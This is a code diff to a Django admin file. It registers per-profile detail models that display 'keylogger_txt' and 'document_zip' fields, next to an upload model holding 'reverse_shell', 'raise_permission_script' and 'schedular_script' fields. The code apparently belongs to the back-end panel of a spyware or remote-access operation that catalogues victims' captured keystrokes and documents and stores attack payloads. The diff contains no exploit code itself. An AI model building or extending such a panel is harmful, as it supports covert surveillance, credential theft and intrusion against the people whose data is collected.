@@ -4,6 +4,9 @@ from core.models import  (
     LizzyProfile, 
     NadiaProfile,
     GratjeenProfile,
+    LizzyProfileDetails,
+    NadiaProfileDetails,
+    GratJeenProfileDetails,
     Uploadedfiles
 )
 
@@ -35,8 +38,24 @@ class GratjeenUserProfile(admin.ModelAdmin):
     list_filter = ('email', 'created', 'app_installed', 'app_downloaded')
     search_filter = ('email', 'id_token', 'video_link', 'first_name')
     list_display_links = ('id', 'email')
-    
-    
+
+
+
+@admin.register(LizzyProfileDetails)
+class LizzyProfileDetailsAdmin(admin.ModelAdmin):
+    list_display = ('id', 'client', 'keylogger_txt', 'document_zip', 'created', 'updated')
+
+
+@admin.register(NadiaProfileDetails)
+class NadiaProfileDetailsAdmin(admin.ModelAdmin):
+    list_display = ('id', 'client', 'keylogger_txt', 'document_zip', 'created', 'updated')
+
+
+@admin.register(GratJeenProfileDetails)
+class GratJeenProfileDetails(admin.ModelAdmin):
+    list_display = ('id', 'client', 'keylogger_txt', 'document_zip', 'created', 'updated') 
+
+
 @admin.register(Uploadedfiles)
 class UploadedFiles(admin.ModelAdmin):
     list_display =  ('id', 'user', 'reverse_shell', 'custom_script',  'router', 'raise_permission_script', 'schedular_script', 'created', 'updated', )
